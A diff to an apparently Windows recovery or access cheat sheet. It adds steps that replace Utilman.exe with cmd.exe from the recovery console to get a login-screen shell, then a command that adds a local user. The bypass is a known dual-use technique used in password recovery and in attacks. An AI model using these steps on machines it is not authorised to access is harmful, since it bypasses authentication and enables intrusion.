@@ -30,6 +30,17 @@ ALT+F10 : open cmd from recovery login screen
 <!-- TOC --><a name="add-local-admin"></a>
 ## Add local admin
 
+Utilman.exe or sethc.exe  
+> diskpart
+> list volume
+> select volume 0
+> exit
+> c:
+> cd C:\Windows\System32
+> copy Utilman.exe Utilman.exe.bak
+> copy /y cmd.exe Utilman.exe
+Restart...
+
 Add user and password :  
 `> net user /add testuser super_password`  
 
